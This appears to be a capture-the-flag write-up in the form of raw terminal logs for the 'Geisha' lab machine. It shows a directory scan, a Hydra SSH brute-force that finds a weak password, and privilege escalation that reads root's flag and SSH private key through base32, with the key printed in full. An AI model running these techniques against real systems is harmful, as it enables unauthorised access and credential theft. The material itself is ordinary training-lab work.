@@ -1,0 +1,155 @@
+Try FTP anonymous login:
+hack@kali:~/CTF/Geisha$ ftp 192.168.1.133
+Connected to 192.168.1.133.
+220 (vsFTPd 3.0.3)
+Name (192.168.1.133:hack): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp> bye
+221 Goodbye.
+
+
+
+
+hack@kali:~/CTF/Geisha$ dirb http://192.168.1.133:7125 /usr/share/wordlists/dirb/big.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon May 18 19:21:15 2020
+URL_BASE: http://192.168.1.133:7125/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.1.133:7125/ ----
++ http://192.168.1.133:7125/passwd (CODE:200|SIZE:1432)                                           
++ http://192.168.1.133:7125/shadow (CODE:403|SIZE:556)     
+
+
+
+User:
+geisha
+
+
+hack@kali:~$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.133 -t 4
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                                       
+                                                                                                   
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-18 19:31:12                 
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.1.133:22/
+[STATUS] 40.00 tries/min, 40 tries in 00:01h, 14344359 to do in 5976:49h, 4 active
+[STATUS] 28.00 tries/min, 84 tries in 00:03h, 14344315 to do in 8538:17h, 4 active
+[STATUS] 26.29 tries/min, 184 tries in 00:07h, 14344215 to do in 9095:04h, 4 active                
+[STATUS] 26.93 tries/min, 404 tries in 00:15h, 14343995 to do in 8876:15h, 4 active                
+[22][ssh] host: 192.168.1.133   login: geisha   password: letmein                                  
+1 of 1 target successfully completed, 1 valid password found                                       
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-18 19:51:06    
+
+
+
+hack@kali:~/CTF/Geisha$ ssh geisha@192.168.1.133
+The authenticity of host '192.168.1.133 (192.168.1.133)' can't be established.                     
+ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.                       
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                           
+Warning: Permanently added '192.168.1.133' (ECDSA) to the list of known hosts.                     
+geisha@192.168.1.133's password:                                                                   
+Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64                    
+                                                                                                   
+The programs included with the Debian GNU/Linux system are free software;                          
+the exact distribution terms for each program are described in the                                 
+individual files in /usr/share/doc/*/copyright.                                                    
+                                                                                                   
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                  
+permitted by applicable law.                                                                       
+Last login: Sat May  9 11:56:59 2020 from 192.168.1.21                                             
+geisha@geisha:~$ 
+
+
+
+
+2 ways to root:
+First: 
+geisha@geisha:~$ base32 /root/flag.txt | base32 --decode
+Flag{Sun_CTF_220_5_G31sha}
+
+
+Second:
+geisha@geisha:~$ base32 /root/.ssh/id_rsa | base32 --decode
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
+OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
+89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
+5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
+fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
+TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
+WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
+1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
+Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
+8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
+jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
+2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
+cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
+THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
+RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
+xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
+1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
+edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
+65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
+XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
+zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
+v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
+OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
+bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
+-----END RSA PRIVATE KEY-----
+
+geisha@geisha:~$ 
+geisha@geisha:~$ 
+geisha@geisha:~$ 
+geisha@geisha:~$ exit
+logout
+Connection to 192.168.1.133 closed.
+hack@kali:~/CTF/Geisha$ 
+hack@kali:~/CTF/Geisha$ vim id_rsa_root
+hack@kali:~/CTF/Geisha$ 
+hack@kali:~/CTF/Geisha$ 
+hack@kali:~/CTF/Geisha$ ssh root@192.168.1.133 -i id_rsa_root 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa_root' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa_root": bad permissions
+root@192.168.1.133's password: 
+
+hack@kali:~/CTF/Geisha$ chmod 600 id_rsa_root 
+hack@kali:~/CTF/Geisha$ ssh root@192.168.1.133 -i id_rsa_root 
+Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat May  9 12:03:57 2020 from 192.168.1.21
+root@geisha:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@geisha:~# cat flag.txt 
+Flag{Sun_CTF_220_5_G31sha}
+root@geisha:~# ls
+flag.txt
+root@geisha:~# 
+
+
+
+
+
